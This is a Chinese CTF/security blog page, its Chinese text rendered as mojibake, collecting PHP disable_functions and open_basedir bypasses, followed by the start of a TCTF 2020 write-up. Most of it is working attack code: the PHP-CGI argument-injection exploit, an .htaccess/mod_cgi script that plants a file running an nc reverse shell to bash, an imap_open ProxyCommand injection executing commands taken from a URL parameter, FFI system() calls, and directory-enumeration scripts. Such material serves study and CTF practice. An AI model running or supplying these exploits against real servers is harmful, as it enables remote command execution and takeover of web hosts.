<pre><code class="html">-s Output HTML syntax highlighted source -d foo[=bar] Define INI entry foo with value bar</code></pre>
<p>ç„¶åå†çœ‹çœ‹æ”»å‡»ä»£ç ç‰‡æ®µ</p>
<pre><code class="php">char poststr[] = &quot;POST %s?%%2D%%64+%%61%%6C%%6C%%6F%%77%%5F&quot; \ &quot;%%75%%72%%6C%%5F%%69%%6E%%63%%6C%%75%%64%%65%%3D%%6F%%6E+%%2D%%64&quot; \ &quot;+%%73%%61%%66%%65%%5F%%6D%%6F%%64%%65%%3D%%6F%%66%%66+%%2D%%64+%%73&quot; \ &quot;%%75%%68%%6F%%73%%69%%6E%%2E%%73%%69%%6D%%75%%6C%%61%%74%%69%%6F%%6E&quot; \ &quot;%%3D%%6F%%6E+%%2D%%64+%%64%%69%%73%%61%%62%%6C%%65%%5F%%66%%75%%6E%%63&quot; \ &quot;%%74%%69%%6F%%6E%%73%%3D%%22%%22+%%2D%%64+%%6F%%70%%65%%6E%%5F%%62&quot; \ &quot;%%61%%73%%65%%64%%69%%72%%3D%%6E%%6F%%6E%%65+%%2D%%64+%%61%%75%%74&quot; \ &quot;%%6F%%5F%%70%%72%%65%%70%%65%%6E%%64%%5F%%66%%69%%6C%%65%%3D%%70%%68&quot; \ &quot;%%70%%3A%%2F%%2F%%69%%6E%%70%%75%%74+%%2D%%64+%%63%%67%%69%%2E%%66%%6F&quot; \ &quot;%%72%%63%%65%%5F%%72%%65%%64%%69%%72%%65%%63%%74%%3D%%30+%%2D%%64+%%63&quot; \ &quot;%%67%%69%%2E%%72%%65%%64%%69%%72%%65%%63%%74%%5F%%73%%74%%61%%74%%75%%73&quot; \ &quot;%%5F%%65%%6E%%76%%3D%%30+%%2D%%6E HTTP/1.1\r\n&quot; \</code></pre>
<p>è§£ç å‡ºæ¥æ˜¯</p>
<pre><code class="php">%s?-d allow_url_include=on -d safe_mode=off -d suhosin.simulation3Don -d disable_functions=&quot;&quot; -d open_basedir=none -d auto_prepend_file=php://input -d cgi.fo&quot;rce_redirect=0 -d cgi.redirect_status_env=0 -n</code></pre>
<p>è¿™æ ·Kingcopeçš„æ”»å‡»ä»£ç æ€è·¯å°±å‡ºæ¥äº†ã€‚</p>
<p>å…³é—­å„ç§é˜²æŠ¤çš„å‚æ•°ï¼Œæ‰“å¼€å„ç§å±é™©çš„å‚æ•°ï¼Œæœ€ååˆ©ç”¨auto_prepend_fileï¼ˆæˆ–auto_append_fileï¼‰è¿™ä¸ªå‚æ•°æŠŠé»‘å®¢éœ€è¦æ‰§è¡Œçš„ç³»ç»Ÿå‘½ä»¤ä¼ é€’è¿‡å»äº†ã€‚</p>
<h3 id="åˆ©ç”¨æ¡ä»¶"><a href="#åˆ©ç”¨æ¡ä»¶" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h3><p>1ã€apache+phpæ˜¯ç”¨cgiæ¨¡å¼è·‘çš„ï¼Œä¾‹å¦‚apacheçš„mod_cgid</p>
<p>2ã€phpè§£é‡Šå™¨éœ€è¦å¯ä»¥ä»ä¸‹é¢çš„urlè®¿é—®åˆ°ï¼Œå½“ç„¶æˆ–è®¸å¯èƒ½æ˜¯å…¶ä»–çš„urlï¼Œè¿™ä¸ªå…·ä½“è¦çœ‹ä½ çš„é…ç½®</p>
<pre><code class="html">    /cgi-bin/php
    /cgi-bin/php5
    /cgi-bin/php-cgi
    /cgi-bin/php.cgi
    /cgi-bin/php4</code></pre>
<p>3ã€phpç‰ˆæœ¬<br>PHPç‰ˆæœ¬å°äº5.3.12<br>PHPç‰ˆæœ¬å°äº5.4.2</p>
<p>æˆ–è€…</p>
<ol>
<li>mod_cgiå·²ç»å¯ç”¨ </li>
<li>å¿…é¡»å…è®¸.htaccessæ–‡ä»¶ , åœ¨httpd.confä¸­ï¼Œè¦æ³¨æ„AllowOverrideé€‰é¡¹ä¸ºAll </li>
<li>å¿…é¡»æœ‰æƒé™å†™.htaccessæ–‡ä»¶</li>
</ol>
<h3 id="åˆ©ç”¨è„šæœ¬"><a href="#åˆ©ç”¨è„šæœ¬" class="headerlink" title="åˆ©ç”¨è„šæœ¬"></a>åˆ©ç”¨è„šæœ¬</h3><pre><code class="php">&lt;?php
$cmd = &quot;nc -c&#39;/bin/bash&#39; 127.0.0.1 4444&quot;; //åå¼¹ä¸€ä¸ªshellå‡ºæ¥ï¼Œè¿™é‡Œç”¨æœ¬åœ°çš„4444ç«¯å£
$shellfile =&quot;#!/bin/bash\n&quot;; //æŒ‡å®šshell
$shellfile .=&quot;echo -ne \&quot;Content-Type: text/html\\n\\n\&quot;\n&quot;; //éœ€è¦æŒ‡å®šè¿™ä¸ªheaderï¼Œå¦åˆ™ä¼šè¿”å›500
$shellfile .=&quot;$cmd&quot;; 
functioncheckEnabled($text,$condition,$yes,$no) //this surely can be shorter
{
    echo &quot;$text: &quot; . ($condition ?$yes : $no) . &quot;&lt;br&gt;\n&quot;;
}
if(!isset($_GET[&#39;checked&#39;]))
{
    @file_put_contents(&#39;.htaccess&#39;,&quot;\nSetEnv HTACCESS on&quot;, FILE_APPEND); 
    header(&#39;Location: &#39; . $_SERVER[&#39;PHP_SELF&#39;]. &#39;?checked=true&#39;); //æ‰§è¡Œç¯å¢ƒçš„æ£€æŸ¥
}
else
{
    $modcgi = in_array(&#39;mod_cgi&#39;,apache_get_modules()); // æ£€æµ‹mod_cgiæ˜¯å¦å¼€å¯
    $writable = is_writable(&#39;.&#39;); //æ£€æµ‹å½“å‰ç›®å½•æ˜¯å¦å¯å†™
    $htaccess = !empty($_SERVER[&#39;HTACCESS&#39;]);//æ£€æµ‹æ˜¯å¦å¯ç”¨äº†.htaccess
        checkEnabled(&quot;Mod-Cgienabled&quot;,$modcgi,&quot;Yes&quot;,&quot;No&quot;);
        checkEnabled(&quot;Iswritable&quot;,$writable,&quot;Yes&quot;,&quot;No&quot;);
        checkEnabled(&quot;htaccessworking&quot;,$htaccess,&quot;Yes&quot;,&quot;No&quot;);
    if(!($modcgi &amp;&amp; $writable&amp;&amp; $htaccess))
    {
        echo &quot;Error. All of the above mustbe true for the script to work!&quot;; //å¿…é¡»æ»¡è¶³æ‰€æœ‰æ¡ä»¶
    }
    else
    {

 checkEnabled(&quot;Backing 
up.htaccess&quot;,copy(&quot;.htaccess&quot;,&quot;.htaccess.bak&quot;),&quot;Suceeded!Saved in 
.htaccess.bak&quot;,&quot;Failed!&quot;); //å¤‡ä»½ä¸€ä¸‹åŸæœ‰.htaccess

checkEnabled(&quot;Write 
.htaccessfile&quot;,file_put_contents(&#39;.htaccess&#39;,&quot;Options 
+ExecCGI\nAddHandlercgi-script 
.dizzle&quot;),&quot;Succeeded!&quot;,&quot;Failed!&quot;);//.dizzleï¼Œæˆ‘ä»¬çš„ç‰¹å®šæ‰©å±•å
        checkEnabled(&quot;Write shellfile&quot;,file_put_contents(&#39;shell.dizzle&#39;,$shellfile),&quot;Succeeded!&quot;,&quot;Failed!&quot;);//å†™å…¥æ–‡ä»¶
        checkEnabled(&quot;Chmod777&quot;,chmod(&quot;shell.dizzle&quot;,0777),&quot;Succeeded!&quot;,&quot;Failed!&quot;);//ç»™æƒé™
        echo &quot;Executing the script now.Check your listener &lt;img src = &#39;shell.dizzle&#39; style =&#39;display:none;&#39;&gt;&quot;; //è°ƒç”¨
    }
}
?&gt;</code></pre>
<h2 id="imap-open"><a href="#imap-open" class="headerlink" title="imap_open"></a>imap_open</h2><blockquote>
<p>PHP çš„imap_openå‡½æ•°ä¸­çš„æ¼æ´å¯èƒ½å…è®¸ç»è¿‡èº«ä»½éªŒè¯çš„è¿œç¨‹æ”»å‡»è€…åœ¨ç›®æ ‡ç³»ç»Ÿä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚è¯¥æ¼æ´çš„å­˜åœ¨æ˜¯å› ä¸ºå—å½±å“çš„è½¯ä»¶çš„imap_openå‡½æ•°åœ¨å°†é‚®ç®±åç§°ä¼ é€’ç»™rshæˆ–sshå‘½ä»¤ä¹‹å‰ä¸æ­£ç¡®åœ°è¿‡æ»¤é‚®ç®±åç§°ã€‚å¦‚æœå¯ç”¨äº†rshå’ŒsshåŠŸèƒ½å¹¶ä¸”rshå‘½ä»¤æ˜¯sshå‘½ä»¤çš„ç¬¦å·é“¾æ¥ï¼Œåˆ™æ”»å‡»è€…å¯ä»¥é€šè¿‡å‘ç›®æ ‡ç³»ç»Ÿå‘é€åŒ…å«-oProxyCommandå‚æ•°çš„æ¶æ„IMAPæœåŠ¡å™¨åç§°æ¥åˆ©ç”¨æ­¤æ¼æ´ã€‚æˆåŠŸçš„æ”»å‡»å¯èƒ½å…è®¸æ”»å‡»è€…ç»•è¿‡å…¶ä»–ç¦ç”¨çš„exec å—å½±å“è½¯ä»¶ä¸­çš„åŠŸèƒ½ï¼Œæ”»å‡»è€…å¯åˆ©ç”¨è¿™äº›åŠŸèƒ½åœ¨ç›®æ ‡ç³»ç»Ÿä¸Šæ‰§è¡Œä»»æ„shellå‘½ä»¤ã€‚åˆ©ç”¨æ­¤æ¼æ´çš„åŠŸèƒ½ä»£ç æ˜¯Metasploit Frameworkçš„ä¸€éƒ¨åˆ†ã€‚ </p>
</blockquote>
<h3 id="åˆ©ç”¨æ¡ä»¶-1"><a href="#åˆ©ç”¨æ¡ä»¶-1" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h3><p>å­˜åœ¨sshå’ŒrshåŠŸèƒ½ ä¸”  enable_insecure_rsh = true</p>
<h3 id="åˆ©ç”¨è„šæœ¬-æœªæµ‹è¯•"><a href="#åˆ©ç”¨è„šæœ¬-æœªæµ‹è¯•" class="headerlink" title="åˆ©ç”¨è„šæœ¬(æœªæµ‹è¯•)"></a>åˆ©ç”¨è„šæœ¬(æœªæµ‹è¯•)</h3><pre><code class="php">if (!function_exists(&#39;imap_open&#39;)) {
        die(&quot;no imap_open function!&quot;);
}
$server = &quot;x -oProxyCommand=echo\t&quot; . base64_encode($_GET[&#39;cmd&#39;] . &quot;&gt;/tmp/cmd_result&quot;) . &quot;|base64\t-d|sh}&quot;;
//$server = &#39;x -oProxyCommand=echo$IFS$()&#39; . base64_encode($_GET[&#39;cmd&#39;] . &quot;&gt;/tmp/cmd_result&quot;) . &#39;|base64$IFS$()-d|sh}&#39;;
imap_open(&#39;{&#39; . $server . &#39;:143/imap}INBOX&#39;, &#39;&#39;, &#39;&#39;); // or var_dump(&quot;\n\nError: &quot;.imap_last_error());
sleep(5);
echo file_get_contents(&quot;/tmp/cmd_result&quot;);</code></pre>
<h2 id="åˆ©ç”¨pcntlæ’ä»¶ç»•è¿‡"><a href="#åˆ©ç”¨pcntlæ’ä»¶ç»•è¿‡" class="headerlink" title="åˆ©ç”¨pcntlæ’ä»¶ç»•è¿‡"></a>åˆ©ç”¨pcntlæ’ä»¶ç»•è¿‡</h2><pre><code>pcntl_exec(&quot;/bin/bash&quot;, array(&quot;/tmp/b4dboy.sh&quot;));</code></pre><h2 id="FFI"><a href="#FFI" class="headerlink" title="FFI"></a>FFI</h2><h3 id="ç‰¹æ€§"><a href="#ç‰¹æ€§" class="headerlink" title="ç‰¹æ€§"></a>ç‰¹æ€§</h3><p>FFI::load æ— è§† opeb_basedir å¯ä»¥ç›´æ¥åŠ è½½æ–‡ä»¶</p>
<p>FFI ç›¸å¯¹äº php æ›´åŠ åº•å±‚ï¼Œå¯ä»¥æ³„éœ²å†…å­˜</p>
<h3 id="å‘½ä»¤æ‰§è¡Œ"><a href="#å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="å‘½ä»¤æ‰§è¡Œ"></a>å‘½ä»¤æ‰§è¡Œ</h3><pre><code class="php">$ffi=FFI::cdef(&quot;int system(char *command);&quot;,&quot;libc.so.6&quot;);
$ffi-&gt;system(&quot;sleep 5&quot;);</code></pre>
<h3 id="open-basedirï¼Œç¦ç”¨FFI-cdefï¼Œç›®å½•æ— æ³•å†™æ–‡ä»¶å‘½ä»¤æ‰§è¡Œ"><a href="#open-basedirï¼Œç¦ç”¨FFI-cdefï¼Œç›®å½•æ— æ³•å†™æ–‡ä»¶å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="open_basedirï¼Œç¦ç”¨FFI::cdefï¼Œç›®å½•æ— æ³•å†™æ–‡ä»¶å‘½ä»¤æ‰§è¡Œ"></a>open_basedirï¼Œç¦ç”¨FFI::cdefï¼Œç›®å½•æ— æ³•å†™æ–‡ä»¶å‘½ä»¤æ‰§è¡Œ</h3><pre><code>$value=&lt;&lt;&lt;EOF
#define FFI_SCOPE &quot;DUMMY&quot;
#define FFI_LIB &quot;libc.so.6&quot;

int system(const char *command);
EOF;

$tmpHandle = tmpfile();
$metaDatas = stream_get_meta_data($tmpHandle);
$tmpFilename = $metaDatas[&#39;uri&#39;];
fwrite($tmpHandle, $value);
fseek($tmpHandle, 0);
echo fread($tmpHandle, 1024);
var_dump($tmpFilename);
fflush($tmpHandle );


$ffi=FFI::load($tmpFilename);
$ffi-&gt;system(&#39;echo bypass_disable_function &gt; /tmp/testing&#39;);

fclose($tmpHandle);</code></pre><h3 id="å†…å­˜æ³„éœ²"><a href="#å†…å­˜æ³„éœ²" class="headerlink" title="å†…å­˜æ³„éœ²"></a>å†…å­˜æ³„éœ²</h3><pre><code class="php">$c=FFI::load(&quot;/flag.h&quot;);
$b=FFI::cast(&quot;void *&quot;,FFI::new(&quot;int[1]&quot;,false));
$a=FFI::string($b-400000,400000);
var_dump($a);
</code></pre>
<h2 id="php-json-bypass"><a href="#php-json-bypass" class="headerlink" title="php-json-bypass"></a>php-json-bypass</h2><p><a href="https://github.com/mm0r1/exploits/tree/master/php-json-bypass" target="_blank" rel="noopener">https://github.com/mm0r1/exploits/tree/master/php-json-bypass</a></p>
<h2 id="php7-backtrace-bypass"><a href="#php7-backtrace-bypass" class="headerlink" title="php7-backtrace-bypass"></a><strong>php7-backtrace-bypass</strong></h2><p> <a href="https://github.com/mm0r1/exploits/tree/master/php7-backtrace-bypass" target="_blank" rel="noopener">https://github.com/mm0r1/exploits/tree/master/php7-backtrace-bypass</a> </p>
<h2 id="php7-gc-bypass"><a href="#php7-gc-bypass" class="headerlink" title="php7-gc-bypass"></a><strong>php7-gc-bypass</strong></h2><p> <a href="https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass" target="_blank" rel="noopener">https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass</a> </p>
<h2 id="win-shell-execute"><a href="#win-shell-execute" class="headerlink" title="win_shell_execute"></a>win_shell_execute</h2><pre><code class="php">if (!extension_loaded(&quot;win32std&quot;)) die(&quot;win32std extension required!&quot;);
system(&quot;cmd.exe&quot;); //just to be sure that protections work well
win_shell_execute(&quot;..\\..\\..\\..\\windows\\system32\\cmd.exe&quot;);
</code></pre>
<h2 id="ImageMagick"><a href="#ImageMagick" class="headerlink" title="ImageMagick"></a>ImageMagick</h2><h2 id="æ¨èç½‘å€"><a href="#æ¨èç½‘å€" class="headerlink" title="æ¨èç½‘å€"></a>æ¨èç½‘å€</h2><p><a href="https://www.freebuf.com/articles/web/169156.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/169156.html</a></p>
<h2 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h2><p> <a href="https://www.anquanke.com/post/id/197745#h3-5" target="_blank" rel="noopener">https://www.anquanke.com/post/id/197745#h3-5</a> </p>
<p> <a href="https://www.mi1k7ea.com/2019/06/02/æµ…è°ˆå‡ ç§Bypass-disable-functionsçš„æ–¹æ³•" target="_blank" rel="noopener">æµ…è°ˆå‡ ç§Bypass-disable-functionsçš„æ–¹æ³•</a> </p>
<h1 id="bypass-open-basedir"><a href="#bypass-open-basedir" class="headerlink" title="bypass  open_basedir"></a>bypass  open_basedir</h1><h2 id="tmpfileç»•è¿‡open-basediråœ¨-tmpç›®å½•å†™æ–‡ä»¶"><a href="#tmpfileç»•è¿‡open-basediråœ¨-tmpç›®å½•å†™æ–‡ä»¶" class="headerlink" title="tmpfileç»•è¿‡open_basediråœ¨/tmpç›®å½•å†™æ–‡ä»¶"></a>tmpfileç»•è¿‡open_basediråœ¨/tmpç›®å½•å†™æ–‡ä»¶</h2><pre><code>&lt;?php
$value=&lt;&lt;&lt;EOF

EOF;

$tmpHandle = tmpfile();
$metaDatas = stream_get_meta_data($tmpHandle);
$tmpFilename = $metaDatas[&#39;uri&#39;];
fwrite($tmpHandle, $value);
fseek($tmpHandle, 0);
echo fread($tmpHandle, 1024);
var_dump($tmpFilename);
fflush($tmpHandle );



fclose($tmpHandle);</code></pre><h2 id="ini-setä¸chdir-ç»•è¿‡open-basedir"><a href="#ini-setä¸chdir-ç»•è¿‡open-basedir" class="headerlink" title="ini_setä¸chdir ç»•è¿‡open_basedir"></a>ini_setä¸chdir ç»•è¿‡open_basedir</h2><pre><code class="php">mkdir(&#39;img&#39;);
chdir(&#39;img&#39;);
ini_set(&#39;open_basedir&#39;,&#39;..&#39;);
chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);
ini_set(&#39;open_basedir&#39;,&#39;/&#39;);
</code></pre>
<h2 id="globåè®®åˆ—æ ¹ç›®å½•"><a href="#globåè®®åˆ—æ ¹ç›®å½•" class="headerlink" title="globåè®®åˆ—æ ¹ç›®å½•"></a>globåè®®åˆ—æ ¹ç›®å½•</h2><pre><code class="php">$it = new DirectoryIterator(&quot;glob:///*&quot;);
foreach ($it as $f){
    echo $f-&gt;__toString().&quot; &quot;;
}
</code></pre>
<h2 id="realpathåˆ—ç›®å½•"><a href="#realpathåˆ—ç›®å½•" class="headerlink" title="realpathåˆ—ç›®å½•"></a>realpathåˆ—ç›®å½•</h2><p>realpathæ˜¯phpä¸­ä¸€ä¸ªå°†ç›¸å¯¹è·¯å¾„è½¬åŒ–ä¸ºç»å¯¹è·¯å¾„çš„æ–¹æ³•ï¼Œè€Œå¦‚æœå¼€å¯äº†<code>open_basedir</code>çš„è¯ï¼Œå¦‚æœæˆ‘ä»¬ä¼ å…¥ä¸€ä¸ªä¸å­˜åœ¨çš„æ–‡ä»¶åï¼Œä¼šè¿”å›falseï¼Œä½†æ˜¯å¦‚æœæˆ‘ä»¬ä¼ å…¥ä¸€ä¸ªä¸åœ¨<code>open_basedir</code>é‡Œçš„æ–‡ä»¶çš„è¯ï¼Œä»–å°±ä¼šè¿”å›<code>file is not within the allowed path(s)</code>ï¼Œæ‰€ä»¥è¿™ä¸ªæ—¶å€™å°±å¯ä»¥ç±»ä¼¼äºæŠ¥é”™ç›²æ³¨å»çˆ†å‡ºæ–‡ä»¶åäº†<br>è¿™é‡Œæœ‰ä¸ªå°trickï¼Œåˆ©ç”¨windowsä¸‹çš„é€šé…ç¬¦&lt;å’Œ&gt;å»è¿›è¡Œçˆ†ç ´å¯ä»¥å¿«ä¸€ç‚¹</p>
<pre><code class="php">&lt;?php
ini_set(&#39;open_basedir&#39;,dirname(__FILE__));
printf(&quot;open_basedir: %s&lt;br/&gt;&lt;br/&gt;&quot;, ini_get(&#39;open_basedir&#39;));
set_error_handler(&#39;isexist&#39;);
$dir = &#39;d:/test/&#39;;
$file = &#39;&#39;;
$chars = &#39;abcdefghijklmnopqrstuvwxyz0123456789-*/+_&#39;;
for ($i=0; $i&lt;strlen($chars); $i++){
    $file = $dir.$chars[$i].&#39;&lt;&lt;&#39;;
    realpath($file);
}
function isexist($errno, $errstr){
    $regex = &#39;/File\((.*)\) is not within/&#39;;
    printf(&quot;errstr: %s &lt;br/&gt;&quot;,$errstr);
    preg_match($regex, $errstr, $mathes);
    if (isset($mathes[1])){
        printf(&quot;%s &lt;br/&gt;&lt;br/&gt;&quot;, $mathes[1]);
    }
}</code></pre>
<h2 id="SplFileInfo-getRealPathåˆ—ç›®å½•"><a href="#SplFileInfo-getRealPathåˆ—ç›®å½•" class="headerlink" title="SplFileInfo::getRealPathåˆ—ç›®å½•"></a>SplFileInfo::getRealPathåˆ—ç›®å½•</h2><p> SplFileInfoç±»æ˜¯ä¸€ä¸ªç”¨æ¥ä¸ºå•ä¸ªæ–‡ä»¶çš„ä¿¡æ¯æä¾›é«˜çº§çš„é¢å‘å¯¹è±¡çš„æ¥å£ï¼Œè¿™ä¸ªç±»å¯ä»¥è¿›è¡Œå¾ˆå¤šæ–‡ä»¶çš„æ–¹æ³•ï¼Œå…¶ä¸­å°±æœ‰ä¸€ä¸ªæ–¹æ³•å’Œä¹‹å‰çš„<code>realpath</code>å¾ˆç›¸ä¼¼ï¼Œå°±æ˜¯<code>getRealPath</code>ï¼Œè¿™ä¸ªæ–¹æ³•åœ¨è·å–æ–‡ä»¶è·¯å¾„çš„æ—¶å€™ï¼Œå¦‚æœå­˜å…¥ä¸€ä¸ªä¸å­˜åœ¨çš„è·¯å¾„æ—¶ï¼Œä¼šè¿”å›falseï¼Œå¦åˆ™è¿”å›ç»å¯¹è·¯å¾„ï¼Œè€Œä¸”ä»–è¿˜ç›´æ¥å¿½ç•¥äº†<code>open_basedir</code>çš„è®¾å®š </p>
<pre><code class="php">&lt;?php
ini_set(&#39;open_basedir&#39;, dirname(__FILE__));
printf(&quot;open_basedir: %s &lt;br/&gt;&lt;br/&gt;&quot;, ini_get(&#39;open_basedir&#39;));
$basedir = &#39;d:/test/&#39;;
$arr = array();
$chars = &#39;abcdefghijklmnopqrstuvwxyz0123456789&#39;;
for ($i=0; $i &lt; strlen($chars); $i++) {
    $info = new SplFileInfo($basedir . $chars[$i] . &#39;&lt;&lt;&#39;);
    $re = $info-&gt;getRealPath();
    if ($re) {
        echo $re.&quot;&lt;br&gt;&quot;;
    }
}</code></pre>
<h2 id="GDåº“imageftbbox-imagefttextåˆ—ä¸¾ç›®å½•"><a href="#GDåº“imageftbbox-imagefttextåˆ—ä¸¾ç›®å½•" class="headerlink" title="GDåº“imageftbbox/imagefttextåˆ—ä¸¾ç›®å½•"></a>GDåº“imageftbbox/imagefttextåˆ—ä¸¾ç›®å½•</h2><pre><code class="php">&lt;?php
ini_set(&#39;open_basedir&#39;, dirname(__FILE__));
printf(&quot;&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;&quot;, ini_get(&#39;open_basedir&#39;));
set_error_handler(&#39;isexists&#39;);
$dir = &#39;d:/test/&#39;;
$file = &#39;&#39;;
$chars = &#39;abcdefghijklmnopqrstuvwxyz0123456789_&#39;;
for ($i=0; $i &lt; strlen($chars); $i++) { 
    $file = $dir . $chars[$i] . &#39;&lt;&gt;&lt;&#39;;
    //$m = imagecreatefrompng(&quot;zip.png&quot;);
    //imagefttext($m, 100, 0, 10, 20, 0xffffff, $file, &#39;aaa&#39;);
    imageftbbox(100, 100, $file, &#39;aaa&#39;);
}
function isexists($errno, $errstr)
{
    global $file;
    if (stripos($errstr, &#39;Invalid font filename&#39;) === FALSE) {
        printf(&quot;%s&lt;br/&gt;&quot;, $file);
    }
}
?&gt;</code></pre>
<h2 id="bindtextdomainæš´åŠ›çŒœè§£ç›®å½•"><a href="#bindtextdomainæš´åŠ›çŒœè§£ç›®å½•" class="headerlink" title="bindtextdomainæš´åŠ›çŒœè§£ç›®å½•"></a>bindtextdomainæš´åŠ›çŒœè§£ç›®å½•</h2><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200630132038.png" alt="image19658"></p>
<p> å¦‚ä¸Šå›¾ï¼Œè¿™ä¸ªå‡½æ•°ç¬¬äºŒä¸ªå‚æ•°<code>$directory</code>æ˜¯ä¸€ä¸ªæ–‡ä»¶è·¯å¾„ã€‚å®ƒä¼šåœ¨<code>$directory</code>å­˜åœ¨çš„æ—¶å€™è¿”å›<code>$directory</code>ï¼Œä¸å­˜åœ¨åˆ™è¿”å›falseã€‚ </p>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p> <a href="https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html" target="_blank" rel="noopener">https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html</a> </p>
<p> <a href="https://xi4or0uji.github.io/2019/05/15/open_basedir-bypass/#bindtextdomain" target="_blank" rel="noopener">https://xi4or0uji.github.io/2019/05/15/open_basedir-bypass/#bindtextdomain</a> </p>
<p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š <a href="http://blog.ccreater.top/2020/06/30/bypass_disable_function_open_basedir/">http://blog.ccreater.top/2020/06/30/bypass_disable_function_open_basedir/</a> <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.ccreater.top/2020/06/30/bypass_disable_function_open_basedir/" data-id="ckc1hjtqs00005cv00ipr46mf" data-title="bypass_disable_function_open_basedir" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/php/" rel="tag">php</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-tctf2020" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/06/30/tctf2020/" class="article-date">
  <time class="dt-published" datetime="2020-06-29T16:15:54.495Z" itemprop="datePublished">2020-06-30</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">æ¯”èµ›</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/06/30/tctf2020/">tctf2020</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="tctf2020"><a href="#tctf2020" class="headerlink" title="tctf2020"></a>tctf2020</h1><p>å¥½éš¾.jpg</p>
<h2 id="Wechat-Generator"><a href="#Wechat-Generator" class="headerlink" title="Wechat Generator"></a>Wechat Generator</h2><p>è¿™é¢˜åœ¨æˆ‘ä»¬ä¸€å †äººçš„ç¾¤æ®´ä¸‹æ‰åšå‡ºæ¥</p>
<p>é¢˜ç›®ä¸»è¦çš„httpè¯·æ±‚æ˜¯ï¼š</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200629195954.png" alt="image130"></p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200629200021.png" alt="image216"></p>
<p>ä¸</p>
<pre><code>http://pwnable.org:5000/image/VMyeGe/xxx
xxxæ˜¯åç¼€ï¼Œå…·ä½“åˆ—è¡¨åœ¨ï¼šhttps://imagemagick.org/script/formats.php</code></pre><h3 id="ç¬¬ä¸€éƒ¨åˆ†-ImageMagickè¯»å–æ–‡ä»¶"><a href="#ç¬¬ä¸€éƒ¨åˆ†-ImageMagickè¯»å–æ–‡ä»¶" class="headerlink" title="ç¬¬ä¸€éƒ¨åˆ† ImageMagickè¯»å–æ–‡ä»¶"></a>ç¬¬ä¸€éƒ¨åˆ† ImageMagickè¯»å–æ–‡ä»¶</h3><p>æµ‹è¯•shareå‘ç°ï¼Œæ— è®ºæˆ‘ä»¬è¾“å…¥çš„previewidæ—¶å€™å­˜åœ¨ï¼Œéƒ½ä¼šç”Ÿæˆä¸€ä¸ªçŸ­é“¾</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200629200254.png" alt="image480"></p>
<p>è®¿é—®å¯¹åº”çš„pngç•Œé¢æ—¶: <a href="http://pwnable.org:5000//image/ZpVQfl/png" target="_blank" rel="noopener">http://pwnable.org:5000//image/ZpVQfl/png</a> </p>
<p>è¿”å›æŠ¥é”™</p>
<pre><code>{&quot;error&quot;: &quot;Convert exception: unable to open image `previews/testting&#39;: No such file or directory @ error/blob.c/OpenBlob/2874&quot;}</code></pre><p>æ ¹æ®æŠ¥é”™çŒœæµ‹æ˜¯ImageMagick æ¥è½¬æ¢æˆå¯¹åº”çš„åç¼€</p>
<p>fuzzåç¼€åå‘ç°ï¼š</p>
<pre><code>http://pwnable.org:5000/image/FdrpgF/htm</code></pre><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200629200643.png" alt="image857"></p>
<p>æ ¹æ®previewè¿”å›çš„æ•°æ®ï¼Œåç«¯ä¼°è®¡æ˜¯å…ˆç”Ÿæˆä¸€ä¸ªsvg,å†è½¬åŒ–ä¸ºå…¶ä»–çš„æ ¼å¼</p>
<p>æˆ‘ä»¬å†çœ‹çœ‹ä»–ä»¬æ˜¯å¦‚ä½•ä¼ é€’å¹¶è¡¨ç¤ºè¡¨æƒ…çš„</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200629200926.png" alt="image1001"></p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200629201154.png" alt="image1085"></p>
<p>å‘ç°</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200629201349.png" alt="image1173"></p>
<p>ä¿®æ”¹[]é‡Œçš„å€¼å¯ä»¥é€ƒå‡ºå¼•å·çš„é™åˆ¶</p>
